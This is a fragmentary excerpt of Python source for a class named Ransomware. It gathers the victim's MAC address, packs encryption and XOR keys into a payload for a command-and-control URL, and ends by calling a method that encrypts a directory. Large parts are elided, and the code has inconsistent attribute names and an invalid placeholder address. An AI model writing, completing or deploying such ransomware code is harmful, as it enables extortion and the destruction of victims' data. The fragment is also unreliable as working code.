...
class Ransomware:
    ...
    def generate_keys(self):
        ...
        self.victim_mac_addrs = getmac.get_mac_address().encode()
        self.save_keys()


    def save_keys(self):
        print("{}[*] saving encryption keys to command and control server (C2) server...{}".format(fg(10), attr(0)))
        c2_url = "https://127.0.0.0:443/save_keys"
        data = {"mac_addresses": self.encode_keys(self.victim_mac_address), "enc_key": self.encode_keys(self.enc_key), "xor_key": self.encode_keys(self.xor_key), "ix": self.encode_keys(self.x)}
...
ransome = Ransomware()
ransome.dir_to_encrypt("dir_name")